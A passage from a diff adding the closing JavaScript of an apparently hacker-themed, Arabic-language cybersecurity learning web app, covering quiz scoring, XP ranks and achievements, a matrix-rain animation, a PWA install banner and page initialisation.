+  document.getElementById('res-score').className = `result-score ${passed?'green':'red'}`;
+  document.getElementById('res-msg').textContent = pct===100?'// PERFECT_SCORE: مثالي تماماً!':pct>=80?'// WELL_DONE: أداء ممتاز!':pct>=60?'// PASS: راجع الدروس لتحسين النتيجة.':'// FAIL: ارجع للمنهج وأعد المحاولة.';
+  if (passed) { ST.xp+=50; ST.quizPass++; save(); updateHeader(); }
+}
+function resetQuiz() {
+  document.getElementById('quiz-sel').style.display='grid';
+  document.getElementById('quiz-arena').classList.remove('on');
+  document.getElementById('quiz-res').classList.remove('on');
+}
+const shuffle = arr => arr.sort(()=>Math.random()-.5);
+
+// =====================================================
+// PROGRESS
+// =====================================================
+const ACHVS = [
+  {icon:'🌱',name:'FIRST_STEP',desc:'أكمل أول درس',  u:s=>s.done.length>=1},
+  {icon:'📚',name:'READER_x5', desc:'5 دروس مكتملة', u:s=>s.done.length>=5},
+  {icon:'💻',name:'LAB_RAT',   desc:'أكمل أول مختبر',u:s=>s.labs.length>=1},
+  {icon:'🧠',name:'QUIZ_PASS', desc:'اجتز أول اختبار',u:s=>s.quizPass>=1},
+  {icon:'⚡',name:'XP_100',    desc:'100 XP',         u:s=>s.xp>=100},
+  {icon:'🔐',name:'XP_500',    desc:'500 XP',         u:s=>s.xp>=500},
+  {icon:'💀',name:'HACKER',    desc:'10 دروس+3 مختبرات',u:s=>s.done.length>=10&&s.labs.length>=3},
+  {icon:'🏆',name:'ELITE',     desc:'1000 XP',        u:s=>s.xp>=1000},
+];
+function renderProgress() {
+  document.getElementById('pp-less').textContent = ST.done.length;
+  document.getElementById('pp-labs').textContent = ST.labs.length;
+  document.getElementById('pp-xp').textContent   = ST.xp;
+  document.getElementById('pp-quiz').textContent  = ST.quizPass;
+  const ranks=[{min:0,max:100,name:'SCRIPT_KIDDIE'},{min:100,max:300,name:'NEWBIE_HACKER'},{min:300,max:600,name:'INTERMEDIATE'},{min:600,max:1000,name:'ADVANCED'},{min:1000,max:Infinity,name:'ELITE_HACKER'}];
+  const rank=ranks.find(r=>ST.xp>=r.min&&ST.xp<r.max)||ranks[4];
+  document.getElementById('rank-name').textContent=rank.name;
+  const pct=rank.max===Infinity?100:Math.round(((ST.xp-rank.min)/(rank.max-rank.min))*100);
+  document.getElementById('xp-counter').textContent=`${ST.xp} / ${rank.max===Infinity?'∞':rank.max} XP`;
+  setTimeout(()=>document.getElementById('xp-fill').style.width=pct+'%',100);
+  updateLvlProgress();
+  document.getElementById('achv-grid').innerHTML=ACHVS.map(a=>`
+    <div class="achv ${a.u(ST)?'unlocked':'locked'}">
+      <div class="achv-icon">${a.icon}</div>
+      <div class="achv-name">${a.name}</div>
+      <div class="achv-desc">${a.desc}</div>
+    </div>`).join('');
+}
+
+// =====================================================
+// TOAST
+// =====================================================
+function toast(msg) {
+  const t=document.createElement('div');
+  t.className='toast'; t.textContent=msg;
+  document.body.appendChild(t);
+  setTimeout(()=>t.remove(),2500);
+}
+
+// =====================================================
+// MATRIX RAIN
+// =====================================================
+function initMatrix() {
+  const canvas=document.getElementById('matrix-canvas');
+  const ctx=canvas.getContext('2d');
+  canvas.width=window.innerWidth; canvas.height=window.innerHeight;
+  const cols=Math.floor(canvas.width/16);
+  const drops=Array(cols).fill(1);
+  const chars='アイウエオカキクケコ0123456789ABCDEF></?!@#';
+  function draw(){
+    ctx.fillStyle='rgba(1,3,6,0.05)';
+    ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle='#00ff41';
+    ctx.font='14px Share Tech Mono';
+    drops.forEach((y,i)=>{
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*16,y*16);
+      if(y*16>canvas.height&&Math.random()>0.975) drops[i]=0;
+      drops[i]++;
+    });
+  }
+  setInterval(draw,50);
+  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+}
+
+// =====================================================
+// PWA
+// =====================================================
+let dPrm;
+window.addEventListener('beforeinstallprompt',e=>{
+  e.preventDefault(); dPrm=e;
+  document.getElementById('pwa-banner').classList.add('on');
+});
+document.getElementById('pwaBtn').addEventListener('click',async()=>{
+  if(!dPrm)return;
+  dPrm.prompt();
+  await dPrm.userChoice;
+  dPrm=null;
+  document.getElementById('pwa-banner').classList.remove('on');
+});
+document.getElementById('pwaClose').addEventListener('click',()=>document.getElementById('pwa-banner').classList.remove('on'));
+if('serviceWorker'in navigator) navigator.serviceWorker.register('sw.js');
+
+// =====================================================
+// INIT
+// =====================================================
+window.addEventListener('load',()=>{
+  initMatrix();
+  initLabs();
+  setTimeout(()=>{
+    document.getElementById('splash').classList.add('out');
+    document.getElementById('app').classList.add('on');
+    updateHeader();
+    updateLvlProgress();
+  },2800);
+});
+</script>
+</body>
+</html>
